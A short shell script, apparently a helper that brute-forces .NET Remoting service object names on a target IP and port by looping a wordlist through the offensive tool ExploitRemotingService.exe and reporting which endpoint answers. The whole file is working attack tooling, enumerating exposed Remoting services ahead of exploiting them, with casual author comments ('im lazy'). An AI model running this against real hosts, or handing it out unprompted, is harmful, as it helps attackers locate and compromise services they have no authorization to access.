 #!/bin/sh

#sh bfNET.sh tarip port

file="objnames.txt"
lines=`cat $file`
echo IP: "$1"
echo Port: "$2"
for line in $lines; do
        if mono ExploitRemotingService.exe -b 0.0.0.0 -p 6666 tcp://"$1":"$2"/"$line" ver|grep 'Requested Service not found';then
         if mono ExploitRemotingService.exe -b 0.0.0.0 -p 6666 tcp://"$1":"$2"/"$line".rem ver|grep 'Requested Service not found';then
          err="er"
         else 
          echo "$line".rem FOUND!!!!!!!
          break
         fi
         err="er" #im lazy.
        else
         echo "$line" FOUND!!!!!!!
         break
        fi
done
echo Done.

#TODO:
#Allow user to set wordlist.
#Be less lazy ;)
